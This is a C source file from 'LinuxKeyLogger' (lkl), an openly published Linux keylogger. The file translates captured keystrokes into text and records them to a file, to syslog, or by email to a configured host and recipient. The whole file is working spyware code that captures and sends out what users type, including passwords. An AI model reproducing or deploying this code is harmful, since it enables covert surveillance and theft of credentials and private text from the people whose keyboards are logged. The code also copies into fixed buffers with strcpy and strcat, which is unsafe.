/*
    LinuxKeyLogger, lkl is a keylogger for x86-arch running under linux.
    Developed by vl4d

    Copyright (C) 2003  Carlo Comin

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

/*
	Every keycode(s) logged by lkl are unsigned integer number
	between 1 and 127. output.c translates these codes in ascii codes
	using a keymap file and print theme with the selected mode (stdout,
	files, e-mail, ...). If you wanna contribute, perhaps the best way is 
	create a keymap and email me at vl4d@spine-group.org (TEST your keymaps
	before email me, PLEASE. I will not accept partial keymaps: i need SHIFT 	and ALT keymaps too!!)
	
	I'll appreciate :) 
*/

#include "lkl.h"

char *asciitab[TABLE_SIZE], *asciitab_shift[TABLE_SIZE], *asciitab_alt[TABLE_SIZE];

void do_output(char c, struct lkl *lkl)
{
	FILE *fp;
	char *ascii;

	ascii = code2ascii(c, lkl);
	if(ascii == NULL) ascii = "NULL";

	if(lkl->outfile == NULL){
		printf("(%s)", ascii);
	}else{
		if((fp = fopen(lkl->outfile, "a")) == NULL){
			perror("fopen()");
			exit(-1);
		}
   
		fprintf(fp, "%s", ascii);
		fclose(fp);
	}

	if(lkl->syslog) syslog(LOG_INFO, "%s", ascii);

	if(lkl->mail) snd_mail(ascii, lkl->host, lkl->rcpt);
}

char *code2ascii(char c, struct lkl *lkl)
{
	char *str;
	static char strtemp[128];
	time_t timet;

	bzero(strtemp, 128);

	if(lkl->pressed_shift){
		str = asciitab_shift[c];
		return str;
	}
	if(lkl->pressed_alt){
		str = asciitab_alt[c];
		return str;
	}

	str = asciitab[c];

	if((strcmp(str, "<Ret>\n") == 0) &&
	   !(lkl->syslog)){
		time(&timet);
		strcpy(strtemp, str);
		strcat(strtemp, ctime(&timet));

		return strtemp;
	}
	
	return str;
}

void def_keymap(char km_file[])
{
	int i;
	char km_fileOLD[256], *ascii[TABLE_SIZE];
	FILE *fp;

	if((fp = fopen(km_file, "r")) == NULL){
		perror("\nunable to find keymap-file");
		printf("a keymap is required!! run lkl with -k <keymap>\n");
		exit(-1);
	}
	strcpy(km_fileOLD, km_file);

	//Standard keymap definition
	for(i = 1; !feof(fp); i++){
		asciitab[i] = (char *)malloc(127);
    		fgets(asciitab[i], 127, fp);

		if(asciitab[i][0] == '#'){
      			i--;
      			continue;
    		}
    		if(!strstr(asciitab[i], "<Ret>")) asciitab[i][(strlen(asciitab[i])-1)] = '\0';
  	}
	
	//Upper Case keymap definition
	strcat(km_file, "UP");
	if((fp = fopen(km_file, "r")) == NULL){
		perror("\nunable to find keymap-file");
		printf("unable to find UPPER case keymap file, check it!\n");
		exit(-1);
	}

	for(i = 1; !feof(fp); i++){
		asciitab_shift[i] = (char *)malloc(127);
		fgets(asciitab_shift[i], 127, fp);

		if(asciitab_shift[i][0] == '#'){
			i--;
			continue;
		}
		if(!strstr(asciitab_shift[i], "<Ret>")) asciitab_shift[i][(strlen(asciitab_shift[i])-1)] = '\0';
	}

	//Alt keymap definition
	strcpy(km_file, km_fileOLD);
	strcat(km_file, "ALT");
		if((fp = fopen(km_file, "r")) == NULL){
			perror("\nunable to find keymap-file");
			printf("unable to find ALT keymap file, check it!\n");
			exit(-1);
		}

	for(i = 1; !feof(fp); i++){
		asciitab_alt[i] = (char *)malloc(127);
		fgets(asciitab_alt[i], 127, fp);

		if(asciitab_alt[i][0] == '#'){
			i--;
			continue;
		}
		asciitab_alt[i][(strlen(asciitab_alt[i])-1)] = '\0';
	}

	fclose(fp);
}

